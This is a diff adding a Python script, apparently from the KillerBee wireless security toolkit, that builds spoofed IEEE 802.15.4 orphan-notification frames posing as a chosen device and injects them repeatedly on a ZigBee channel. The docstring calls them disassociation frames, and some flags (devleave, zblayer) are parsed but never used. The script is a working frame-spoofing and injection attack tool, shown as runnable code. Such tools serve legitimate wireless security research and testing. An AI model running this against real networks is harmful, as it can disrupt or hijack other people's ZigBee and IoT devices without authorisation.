@@ -1,0 +1,71 @@
+#!/usr/bin/env python
+
+# Contributed by Bryan Halfpap <Bryanhalf@gmail.com>, Copyright 2015
+
+import binascii
+import sys
+import argparse
+from time import sleep
+
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # suppress annoying Scapy IPv6 warning
+from killerbee import *
+
+try:
+	from scapy.all import *
+except ImportError:
+	print 'This tool requires Scapy to be installed (specifically scapy-com edition).'
+	from sys import exit
+	exit(-1)
+
+def create_orphan_mac(panid, devleave, coordinator, device, seqnum):
+    '''802.15.4 Disassociation Frame'''
+    b = Dot15d4()/Dot15d4Cmd() #/Dot15d4CmdPANIDConflictNotify()
+    b.fcf_panidcompress = 1    # shall be set to one
+    b.fcf_srcaddrmode = 3      # src shall be set to three (long addr)
+    b.fcf_destaddrmode = 2     #
+    b.fcf_pending = 0          # shall be set to zero
+    b.fcf_ackreq = 1           # shall be set to one
+    b.seqnum = seqnum
+    b.dest_panid = panid       # PAN to which to disassociate
+    b.cmd_id = 6               # Orphan Notification
+    b.dest_addr = coordinator
+    b.src_addr = device
+    return b
+
+if __name__ == '__main__':
+    tohex = lambda s: int(s.replace(':', ''), 16)
+    # Command-line arguments
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-f', '--channel', '-c', action='store', dest='channel', required=True, type=int, default=11)
+    parser.add_argument('-i', '--interface', action='store', dest='devstring', default=None)
+    parser.add_argument('-p', '--panid', action='store', required=True, type=tohex)
+    parser.add_argument('-s', '--coordinator', action='store', required=True, type=tohex)
+    parser.add_argument('-d', '--device', action='store', required=True, type=tohex)
+    #parser.add_argument('-e', '--deviceshort', action='store', required=True, type=tohex)
+    parser.add_argument('-q', '--srcseq', action='store', default=254, type=int)
+    #parser.add_argument('-z', '--srcseqzbnwk', action='store', default=254, type=int)
+    parser.add_argument('--devleave', action='store_true', default=False, help="Define this flag to pretend to be an end device requesting to leave the network.")
+    parser.add_argument('--zblayer', action='store_true', default=False, help="Define this flag to produce a ZigBee NWK layer diassocation request, instead of an 802.15.4 MAC layer request.")
+    parser.add_argument('--numloops', action='store', default=1, type=int)
+    args = parser.parse_args()
+
+    print("Expecting {2:#016x} to be the coordinator on network (PAN ID) {0:#04x}, located on channel {1}.".format(args.panid, args.channel, args.coordinator))
+    print("The device to disassociate is {0:#016x}.".format(args.device))
+    #print("The device to disassociate is {0:#016x} with short address {1:#04x}.".format(args.device, args.deviceshort))
+    #TODO: seqnums for each direction
+
+    kb = KillerBee(device=args.devstring)
+    kb.set_channel(args.channel)
+
+    # For both disassociate request types (initiated by coordinator or device) the ACK frame confirms it
+    seqnummac = args.srcseq
+    for loopnum in range(0, args.numloops):
+        sp = create_orphan_mac(args.panid, args.devleave, args.coordinator, args.device, seqnummac)
+        seqnummac += 1
+        if seqnummac > 255:
+            seqnummac = 0
+        print sp.summary()
+        kb.inject(str(sp))
+        sleep(0.005)
+
